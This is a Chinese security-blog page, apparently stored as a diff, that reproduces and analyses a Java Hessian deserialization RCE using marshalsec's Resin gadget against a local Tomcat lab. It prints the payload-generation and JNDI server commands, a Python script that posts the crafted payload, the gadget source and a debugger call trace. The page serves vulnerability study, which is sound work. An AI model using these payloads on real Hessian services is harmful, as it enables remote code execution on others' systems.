+<li><a href="/2019/01/31/PHP伪协议/">PHP伪协议</a></li>
+<li><a href="/2019/01/01/phar反序列化漏洞/">phar反序列化漏洞</a></li>
+<li><a href="/2019/01/01/Windows下的一种PHP隐蔽后门姿势/">Windows下的一种PHP隐藏后门姿势</a></li>
+<li><a href="/2019/01/01/PHP反序列化漏洞/">PHP unserialize反序列化漏洞</a></li>
+<li><a href="/2019/01/01/PHP内存型木马/">PHP内存型木马</a></li>
+</ul>
+</li>
+<li>CMS<ul>
+<li><a href="/2019/01/02/PHP代码审计实战之盾灵CMS/">PHP代码审计实战之盾灵CMS</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Python</strong><ul>
+<li>Python安全<ul>
+<li><a href="/2019/06/02/浅析Python-Flask-SSTI/">浅析Python Flask SSTI</a></li>
+<li><a href="/2019/05/31/Python沙箱逃逸小结/">Python沙箱逃逸小结</a></li>
+<li><a href="/2019/01/01/PyYAML反序列化漏洞/">Python PyYAML反序列化漏洞</a></li>
+<li><a href="/2019/01/01/cPickle反序列化漏洞/">Python cPickle反序列化漏洞</a></li>
+</ul>
+</li>
+<li>安全开发<ul>
+<li><a href="/2019/06/30/AWD文件监控脚本/">AWD文件监控脚本</a></li>
+<li><a href="/2019/01/01/Python安全小工具之反编译pyc文件/">Python安全小工具之反编译pyc文件</a></li>
+</ul>
+</li>
+<li>爬虫</li>
+<li>Django</li>
+</ul>
+</li>
+<li><strong>JavaScript</strong><ul>
+<li>JavaScript安全<ul>
+<li><a href="/2019/10/20/浅析JavaScript原型链污染攻击/">浅析JavaScript原型链污染攻击</a></li>
+</ul>
+</li>
+<li>NodeJS</li>
+<li>AngularJS</li>
+</ul>
+</li>
+<li><strong>GO</strong><ul>
+<li>GO安全<ul>
+<li><a href="/2020/01/01/浅析Influxdb认证绕过漏洞/">浅析Influxdb认证绕过漏洞</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>二进制安全</strong><ul>
+<li>二进制基础<ul>
+<li><a href="/2019/05/24/GOT表-PLT表与动态链接/">ELF动态链接,PLT和GOT</a></li>
+<li><a href="/2019/04/27/堆基础/">堆基础</a></li>
+<li><a href="/2019/04/15/ELF二进制格式/">ELF二进制格式</a></li>
+<li><a href="/2019/03/03/栈及栈帧/">栈基础</a></li>
+<li><a href="/2019/02/09/ELF安全防御机制小结/">ELF安全防御机制小结</a></li>
+<li><a href="/2019/01/28/IA-32寄存器/">IA-32（Intel Architecture 32位）寄存器</a></li>
+<li><a href="/2019/01/01/Linux环境与相关工具/">Linux环境与相关工具</a></li>
+</ul>
+</li>
+<li>C/C++<ul>
+<li><a href="/2019/03/24/C编写实现Linux反弹shell/">C编写实现Linux反弹shell</a></li>
+</ul>
+</li>
+<li>逆向工程</li>
+<li>Fuzzing</li>
+<li>Pwn<ul>
+<li><a href="/2019/04/20/花式栈溢出之stack-pivoting/">花式栈溢出之stack pivoting</a></li>
+<li><a href="/2019/04/12/中级ROP之ret2csu/">栈溢出之ret2csu</a></li>
+<li><a href="/2019/04/09/蒸米ROP学习笔记/">蒸米32位及64位ROP笔记</a></li>
+<li><a href="/2019/04/07/pwntools笔记/">pwntools笔记</a></li>
+<li><a href="/2019/03/23/花式栈溢出之Stack-smash/">花式栈溢出之Stack smash</a></li>
+<li><a href="/2019/03/05/栈溢出之ret2libc/">栈溢出之ret2libc</a></li>
+<li><a href="/2019/03/03/栈溢出之ret2syscall/">栈溢出之ret2syscall</a></li>
+<li><a href="/2019/03/03/栈溢出之ret2shellcode/">栈溢出之ret2shellcode</a></li>
+<li><a href="/2019/03/03/ROP之ret2text/">ROP基础及栈溢出之ret2text</a></li>
+<li><a href="/2019/03/03/栈溢出基本原理/">栈溢出基本原理</a></li>
+</ul>
+</li>
+<li>WriteUp Pwn<ul>
+<li><a href="/2019/03/08/TAMUctf-Pwn-writeup/">TAMUctf Pwn writeup</a></li>
+</ul>
+</li>
+<li>WriteUp Reverse<ul>
+<li><a href="/2019/01/01/HITB_Binary_100_writeup/">HITB Binary 100 writeup</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>渗透测试</strong><ul>
+<li>基础&amp;Tricks</li>
+<li>Kali</li>
+<li>Metasploit</li>
+<li>内网渗透</li>
+<li>提权<ul>
+<li><a href="/2019/01/01/关于本地提权的学习笔记（一）：Administrator提权到System">Administrator提权到System</a></li>
+<li><a href="/2019/01/01/关于本地提权的学习笔记（二）：注入进程和利用漏洞提权">注入进程和利用漏洞提权</a></li>
+</ul>
+</li>
+<li>免杀</li>
+<li>工具</li>
+</ul>
+</li>
+<li><strong>OS</strong><ul>
+<li>Windows<ul>
+<li><a href="/2019/01/01/将Python脚本转换为exe">将Python脚本转换为exe</a></li>
+<li><a href="/2019/01/01/几个查看用户信息的Windows程序">几个查看用户信息的Windows程序</a></li>
+</ul>
+</li>
+<li>Linux</li>
+</ul>
+</li>
+</ul>
+
+  </div>
+</div>
+</div>
+
+<header class="post-header text-center">
+	<h1 class="title">
+		Java Hessian反序列化漏洞
+	</h1>
+	<span class="read">
+		阅读量 <span id="busuanzi_value_page_pv"></span>
+	</span>
+</header><br>
+
+<div class="book-post">
+  <h2 id="0x01-Hessian简介"><a href="#0x01-Hessian简介" class="headerlink" title="0x01 Hessian简介"></a>0x01 Hessian简介</h2><p>Hessian是一个轻量级的remoting onhttp工具，是一个轻量级的Java序列化/反序列化框架，使用简单的方法提供了RMI的功能。 相比WebService，Hessian更简单、快捷。采用的是二进制RPC协议，因为采用的是二进制协议，所以它很适合于发送二进制数据。</p>
+<p>Hessian序列化/反序列化机制的基本概念图如下：</p>
+<p><img src="/2020/01/25/Java-Hessian反序列化漏洞/16.png" alt=""></p>
+<ul>
+<li>AbstractSerializerFactory：抽象序列化器工厂，是管理和维护对应序列化/反序列化机制的工厂，拥有getSerializer()和getDeserializer()方法。默认的几种实现如下：<ul>
+<li>SerializerFactory：标准的实现。</li>
+<li>ExtSerializerFactory：可以设置自定义的序列化机制，通过该Factory可以进行扩展。</li>
+<li>BeanSerializerFactory：对SerializerFactory的默认Object的序列化机制进行强制指定，指定为BeanSerializer。 </li>
+</ul>
+</li>
+<li>Serializer：序列化的接口，拥有writeObject()方法。</li>
+<li>Deserializer：反序列化的接口，拥有readObject()、resdMap()、readList()方法。</li>
+<li>AbstractHessianInput：Hessian自定义的输入流，提供对应的read各种类型的方法。</li>
+<li>AbstractHessianOutput：Hessian自定义的输出流，提供对应的write各种类型的方法。</li>
+</ul>
+<p>在Hessian的Serializer中，有以下几种默认实现的序列化器：</p>
+<p><img src="/2020/01/25/Java-Hessian反序列化漏洞/17.png" alt=""></p>
+<p>在Hessian的Deserializer中，有以下几种默认实现的反序列化器：</p>
+<p><img src="/2020/01/25/Java-Hessian反序列化漏洞/18.png" alt=""></p>
+<p>这里我们关注到MapDeserializer这个反序列化器即可，其在后面的反序列化漏洞利用中应用到。</p>
+<h2 id="0x02-Hessian反序列化漏洞"><a href="#0x02-Hessian反序列化漏洞" class="headerlink" title="0x02 Hessian反序列化漏洞"></a>0x02 Hessian反序列化漏洞</h2><p>和Java原生的序列化对比，Hessian更加高效并且非常适合二进制数据传输。既然是一个序列化/反序列化框架，Hessian同样存在反序列化漏洞的问题。</p>
+<p>对于Hessian反序列化漏洞的利用，使用ysoserial工具的Gadget是无法成功的，而是要用marshalsec工具的Gadget。</p>
+<p>marshalsec工具项目如下：<a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">https://github.com/mbechler/marshalsec</a></p>
+<p>针对Hessian反序列化过程进行攻击，就需要使用特殊的Gadget，在marshalsec这个工具里，已经有了5个可用的Gadgets。分别是：</p>
+<ul>
+<li>Rome</li>
+<li>XBean</li>
+<li>Resin</li>
+<li>SpringPartiallyComparableAdvisorHolder</li>
+<li>SpringAbstractBeanFactoryPointcutAdvisor</li>
+</ul>
+<h3 id="复现——Resin-Gadget"><a href="#复现——Resin-Gadget" class="headerlink" title="复现——Resin Gadget"></a>复现——Resin Gadget</h3><p>Hessian环境搭建按照参考文章很方便就搞好。</p>
+<p><img src="/2020/01/25/Java-Hessian反序列化漏洞/3.png" alt=""></p>
+<p>和JNDI注入时一样，现在要搭建恶意的JNDI服务端，这里直接用JNDI注入利用工具项目而不用像之前一样自己写服务端代码：<a href="https://github.com/welk1n/JNDI-Injection-Exploit" target="_blank" rel="noopener">https://github.com/welk1n/JNDI-Injection-Exploit</a></p>
+<p>使用方法如下，-C参数为需要执行的命令，-A参数为监听地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [command] [-A] [address]</span><br></pre></td></tr></table></figure>
+<p>这里我们用直接启动就行，可以看到是有三个不同的服务端对应不同的端口：</p>
+<p><img src="/2020/01/25/Java-Hessian反序列化漏洞/1.png" alt=""></p>
+<p>直接用marshalsec来生成payload，这里地址指定为JettyServer并在指定恶意执行类为ExecTemplateJDK7：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian Resin http://127.0.0.1:8180/ ExecTemplateJDK7&gt;hessian</span><br></pre></td></tr></table></figure>
+<p>最后就是编写序列化的payload发送到服务器，这里直接看下原作者的脚本是怎么写的：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">h<span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># code by 21superman</span></span><br><span class="line"><span class="comment"># Date 2018年12月28日</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load</span><span class="params">(name)</span>:</span></span><br><span class="line">    header=<span class="string">b'\x63\x02\x00\x48\x00\x04'</span>+<span class="string">'test'</span></span><br><span class="line">    <span class="keyword">with</span> open(name,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> header+f.read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(url,payload)</span>:</span></span><br><span class="line">    <span class="comment">#proxies = &#123;'http':'127.0.0.1:8888'&#125;</span></span><br><span class="line">    headers=&#123;<span class="string">'Content-Type'</span>:<span class="string">'x-application/hessian'</span>&#125;</span><br><span class="line">    data=payload</span><br><span class="line">    res=requests.post(url,headers=headers,data=data)</span><br><span class="line">    <span class="keyword">return</span> res.text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">"-u"</span>, help=<span class="string">"hessian site url eg.http://127.0.0.1:8080/HessianTest/hessian"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"-p"</span>,help=<span class="string">"payload file"</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> args.u==<span class="keyword">None</span> <span class="keyword">or</span> args.p==<span class="keyword">None</span>:</span><br><span class="line">        print(<span class="string">'eg. python hessian.py -u http://127.0.0.1:8080/HessianTest/hessian -p hessian'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        send(args.u, load(args.p))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br><span class="line">    <span class="comment">#load('hessian')</span></span><br></pre></td></tr></table></figure>
+<p>先是将marshalsec生成的payload和构造的header拼接成Hessian格式的序列化内容，然后通过POST方式发送该Hessian序列化的内容，其中需要指定Content-Type头为’x-application/hessian’让服务端识别出事Hessian序列化类型的数据。</p>
+<p>运行脚本，成功触发反序列化漏洞：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python hessian.py -u http://127.0.0.1:8080/HessianTest/hessian -p hessian</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/01/25/Java-Hessian反序列化漏洞/2.png" alt=""></p>
+<h3 id="Resin-Gadget分析"><a href="#Resin-Gadget分析" class="headerlink" title="Resin Gadget分析"></a>Resin Gadget分析</h3><p>调试分析之前，我们需要知道marshalsec中Resin Gadget到底是如何触发反序列化漏洞RCE的。</p>
+<p>我们看下Gadget怎么写的：<a href="https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/gadgets/Resin.java" target="_blank" rel="noopener">https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/gadgets/Resin.java</a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> marshalsec.gadgets;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.CannotProceedException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.directory.DirContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.naming.QName;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> marshalsec.MarshallerBase;</span><br><span class="line"><span class="keyword">import</span> marshalsec.UtilFactory;</span><br><span class="line"><span class="keyword">import</span> marshalsec.util.Reflections;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> mbechler</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Resin</span> <span class="keyword">extends</span> <span class="title">Gadget</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Args</span> ( minArgs = <span class="number">2</span>, args = &#123;</span><br><span class="line">        <span class="string">"codebase"</span>, <span class="string">"class"</span></span><br><span class="line">    &#125;, defaultArgs = &#123;</span><br><span class="line">        MarshallerBase.defaultCodebase, MarshallerBase.defaultCodebaseClass</span><br><span class="line">    &#125; )</span><br><span class="line">    <span class="function"><span class="keyword">default</span> Object <span class="title">makeResinQName</span> <span class="params">( UtilFactory uf, String[] args )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; ccCl = Class.forName(<span class="string">"javax.naming.spi.ContinuationDirContext"</span>); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">        Constructor&lt;?&gt; ccCons = ccCl.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);</span><br><span class="line">        ccCons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        CannotProceedException cpe = <span class="keyword">new</span> CannotProceedException();</span><br><span class="line">        Reflections.setFieldValue(cpe, <span class="string">"cause"</span>, <span class="keyword">null</span>);</span><br><span class="line">        Reflections.setFieldValue(cpe, <span class="string">"stackTrace"</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        cpe.setResolvedObj(<span class="keyword">new</span> Reference(<span class="string">"Foo"</span>, args[ <span class="number">1</span> ], args[ <span class="number">0</span> ]));</span><br><span class="line"></span><br><span class="line">        Reflections.setFieldValue(cpe, <span class="string">"suppressedExceptions"</span>, <span class="keyword">null</span>);</span><br><span class="line">        DirContext ctx = (DirContext) ccCons.newInstance(cpe, <span class="keyword">new</span> Hashtable&lt;&gt;());</span><br><span class="line">        QName qName = <span class="keyword">new</span> QName(ctx, <span class="string">"foo"</span>, <span class="string">"bar"</span>);</span><br><span class="line">        <span class="keyword">return</span> uf.makeToStringTriggerStable(qName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>分析可知：</p>
+<ol>
+<li>先定义了javax.naming.spi.ContinuationDirContext类实例，然后调用getDeclaredConstructor()函数生成CannotProceedException类和Hashtable类的结构体实例，用于构造后面的DirContext类实例并通过构造函数赋值给QName类实例的<code>_context</code>属性。</li>
+<li>然后定义了一个CannotProceedException类变量cpe，该类用于程序出现异常时通过调用javax.naming.spi.NamingManager提供的方法（比如 getContinuationContext()）来查找另一个提供程序以继续操作；这里调用了setResolvedObj()函数设置此异常的已解析对象字段为恶意的Reference类实例，可以看到是Reference()的classFactoryLocation参数的JNDI注入利用，注意该Reference最后是传入到QName构造函数的第一个参数中。</li>
+<li>接着，将设置好的cpe传入DirContext的newInstance()函数中新建实例。</li>
+<li>最后定义了com.caucho.naming.QName这个类实例，再调用makeToStringTriggerStable()函数处理该对象并返回。</li>
+</ol>
+<p>接着跟踪makeToStringTriggerStable()函数的实现，根本是调用的ToStringUtil.makeToStringTrigger()函数：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">makeToStringTrigger</span> <span class="params">( Object o )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    String unhash = unhash(o.hashCode());</span><br><span class="line">    XString xString = <span class="keyword">new</span> XString(unhash);</span><br><span class="line">    <span class="keyword">return</span> JDKUtil.makeMap(o, xString);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>分析可知，用到了com.sun.org.apache.xpath.internal.objects.XString这个类来和QName对象生成并返回一个Map对象。使用这个处理的目的是为了调用到QName.toString()函数。</p>
+<p>最后我们看下com.caucho.naming.QName类的toString()函数：</p>
+<p><img src="/2020/01/25/Java-Hessian反序列化漏洞/15.png" alt=""></p>
+<p>在toString()函数中，QName类的<code>_context</code>属性调用了composeName()函数。我们Gadget打进去后该属性类型为ContinuationDirContext，其中的cpe为CannotProceedException类实例，在调用到此处时会触发NamingException异常，此时会调用javax.naming.spi.NamingManager.getObjectFactoryFromReference()函数去加载Reference指定地址的服务，最后就是lookup()，从而导致RCE。</p>
+<h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>这里使用IDEA对Tomcat的war包进行远程调试。</p>
+<p>由于在Windows本地运行的Tomcat，因此打开Tomcat的配置文件catalina.bat添加如下配置再重启Tomcat即可开启远程调试的端口：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set CATALINA_OPTS=&quot;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5555&quot;</span><br></pre></td></tr></table></figure>
+<p>接着本地解压war包并用IDEA打开，然后使用Remote远程连接到Tomcat后，当显示”Connected to the target VM, address: ‘localhost:5555’, transport: ‘socket’”时表示成功，即可开始远程调试。</p>
+<p>我们从配置文件web.xml开始看，这里有个URL的匹配路径/hessian，也就是刚刚我们访问的那个接口，可以看到其对应的是HessianServlet这个类：</p>
+<p><img src="/2020/01/25/Java-Hessian反序列化漏洞/4.png" alt=""></p>
+<p>跟进该类，直接在service()函数中下断点，然后浏览器再次访问<code>http://127.0.0.1:8080/HessianTest/hessian</code>页面即可停在断点处：</p>
+<p><img src="/2020/01/25/Java-Hessian反序列化漏洞/5.png" alt=""></p>
+<p>可以看到，这个接口需要POST方式来传数据，否则直接返回500。</p>
+<p>重新发送payload，往下调试，看到会获取request请求中的输入流，然后调用invoke()函数：</p>
+<p><img src="/2020/01/25/Java-Hessian反序列化漏洞/6.png" alt=""></p>
+<p>跟下去，在invoke()函数中会调用相关函数读取头类型，并在下面的switch语句中匹配符合条件的头类型进入不同的逻辑，这里获取到的头类型是<code>CALL_1_REPLY_2</code>，则调用createHessianInput()函数创建Hessian输入流和输出流：</p>
+<p><img src="/2020/01/25/Java-Hessian反序列化漏洞/7.png" alt=""></p>
+<p>接着会判断序列化器工厂是否为空，这里为非空则设置到Hessian的输入流和输出流，然后调用invoke()：</p>
+<p><img src="/2020/01/25/Java-Hessian反序列化漏洞/8.png" alt=""></p>
+<p>跟进去这个invoke()函数，这里循环遍历读入header头，若header存在则调用Hessian输入流的readObject()，这里读取到了python脚本构造的名为test的Hessian头：</p>
+<p><img src="/2020/01/25/Java-Hessian反序列化漏洞/9.png" alt=""></p>
+<p>跟进去HessianInput.readObject()函数中，其中先获取tag值为77即’M’，然后匹配到对应的switch语句中调用readMap()函数：</p>
+<p><img src="/2020/01/25/Java-Hessian反序列化漏洞/10.png" alt=""></p>
+<p>跟进SerializerFactory.readMap()函数中，由于type为空且已经存在HashMap反序列化器，因此会调用MapDeserializer的readMap()函数继续解析序列化的Map内容：</p>
+<p><img src="/2020/01/25/Java-Hessian反序列化漏洞/11.png" alt=""></p>
+<p>跟进去MapDeserializer.readMap()函数，先新建一个HashMap实例，然后循环遍历HessianInput的内容，将其中的键值都进行readObject()操作然后再put进该新建的HashMap实例中：</p>
+<p><img src="/2020/01/25/Java-Hessian反序列化漏洞/12.png" alt=""></p>
+<p>这里readObject()处理过程也是一样的，简单地说就是获取序列化内容的类类型、属性值等（这里为反序列化获取com.caucho.naming.QName类及其属性值等，具体过程可自行调试下）。此处下断点然后F8过两次就能直接触发弹计算器了。</p>
+<p>HashMap.put()函数中会调用hash(key)来计算对象的hash，然后再调用putVal()来设置HashMap的值：</p>
+<p><img src="/2020/01/25/Java-Hessian反序列化漏洞/13.png" alt=""></p>
+<p>这里hash(key)实际上就是调用的QName的hashCode()，在我本地调试的时候就出触发一次弹计算器（其实在获取了QName的<code>_items</code>属性后，只要在本地调试调用到QName的函数都会弹计算器，原因应该就是QName的<code>_context</code>属性中的cpe是个CannotProceedException类，会一直触发异常导致提前RCE）：</p>
+<p><img src="/2020/01/25/Java-Hessian反序列化漏洞/14.png" alt=""></p>
+<p>在第二次调用到HashMap.put()函数时，此时调用了XString的equals()函数：</p>
+<p><img src="/2020/01/25/Java-Hessian反序列化漏洞/19.png" alt=""></p>
+<p>在XString.equals()函数中，调用了QName.toString()函数：</p>
+<p><img src="/2020/01/25/Java-Hessian反序列化漏洞/20.png" alt=""></p>
+<p>调用到QName.toString()函数，这里才是真正的漏洞触发点，我们由前面知道marshalsec工具的Resin Gadget中QName类对象的<code>_context</code>属性的cpe是被设置为CannotProceedException类，该属性在调用composeName()函数时会捕获到NamingException异常，此时会调用javax.naming.spi.NamingManager的getContext()函数来查找另一个提供程序即恶意Reference来继续执行操作，从而触发RCE：</p>
+<p><img src="/2020/01/25/Java-Hessian反序列化漏洞/21.png" alt=""></p>
+<p>此时我们打开看下NamingException类实例即变量e中的stackTrace，验证了前面的分析，即QName.toString()中的漏洞点是在composeName()调用中，这里由于NamingException异常导致调用了NamingManager.getContext()来查找另一个程序继续执行，这其中有调用了NamingManager.getObjectFactoryFromReference()函数来加载payload中设置的恶意Reference地址指向的服务上的类，从而导致RCE：</p>
+<p><img src="/2020/01/25/Java-Hessian反序列化漏洞/22.png" alt=""></p>
+<p>此时的函数调用栈如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">toString:346, QName (com.caucho.naming)</span><br><span class="line">equals:392, XString (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">putVal:634, HashMap (java.util)</span><br><span class="line">put:611, HashMap (java.util)</span><br><span class="line">readMap:114, MapDeserializer (com.caucho.hessian.io)</span><br><span class="line">readMap:573, SerializerFactory (com.caucho.hessian.io)</span><br><span class="line">readObject:1160, HessianInput (com.caucho.hessian.io)</span><br><span class="line">invoke:240, HessianSkeleton (com.caucho.hessian.server)</span><br><span class="line">invoke:198, HessianSkeleton (com.caucho.hessian.server)</span><br><span class="line">invoke:425, HessianServlet (com.caucho.hessian.server)</span><br><span class="line">service:405, HessianServlet (com.caucho.hessian.server)</span><br><span class="line">internalDoFilter:231, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:166, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:52, WsFilter (org.apache.tomcat.websocket.server)</span><br><span class="line">internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:166, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">invoke:199, StandardWrapperValve (org.apache.catalina.core)</span><br><span class="line">invoke:96, StandardContextValve (org.apache.catalina.core)</span><br><span class="line">invoke:543, AuthenticatorBase (org.apache.catalina.authenticator)</span><br><span class="line">invoke:139, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:81, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:678, AbstractAccessLogValve (org.apache.catalina.valves)</span><br><span class="line">invoke:87, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:343, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:609, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:65, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:810, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:1623, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:49, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:1142, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:617, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:745, Thread (java.lang)</span><br></pre></td></tr></table></figure>
+<h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://www.freebuf.com/vuls/224280.html" target="_blank" rel="noopener">Hessian反序列化RCE漏洞复现及分析</a></p>
+<p><a href="https://mp.weixin.qq.com/s/vW6IgaA_Imc7-_Bac9XNQg" target="_blank" rel="noopener">SOFA-Hessian反序列漏洞</a></p>
+<p><a href="https://docs.ioin.in/writeup/blog.csdn.net/_u011721501_article_details_79443598/index.html" target="_blank" rel="noopener">Java Unmarshalling Security - 攻击Hessian协议</a></p>
+
+</div>
+
+<br>
+<div><center>
+  <span>Copyright &copy; Mi1k7ea</span>  |  <span id="busuanzi_container_site_uv">本站总访问量 <span id="busuanzi_value_site_uv"></span> 次</span>
+</center></div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+<script src="/js/book-post.js"></script>
+        </div>
+      </div>
+
+      <div class="column col-2 hide-lg">
+        <div class="book-toc">
+  <div class="book-tocbot">
+  </div>
+  <div class="book-tocbot-menu">
+    <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+    <a onclick="go_top()">Back to top</a>
+    <a onclick="go_bottom()">Go to bottom</a>
+  </div>
+</div>
+
+<script>
+tocbot.init({
+  tocSelector: '.book-tocbot',
+  contentSelector: '.book-post',
+  headingSelector: 'h1, h2, h3, h4, h5',
+  collapseDepth: 2,
+  orderedList: false,
+  scrollSmooth: false,
+});
+
+function expand_toc(){
+  var b = document.querySelector(".book-toc-expand");
+  tocbot.init({
+    tocSelector: '.book-tocbot',
+    contentSelector: '.book-post',
+    headingSelector: 'h1, h2, h3, h4, h5',
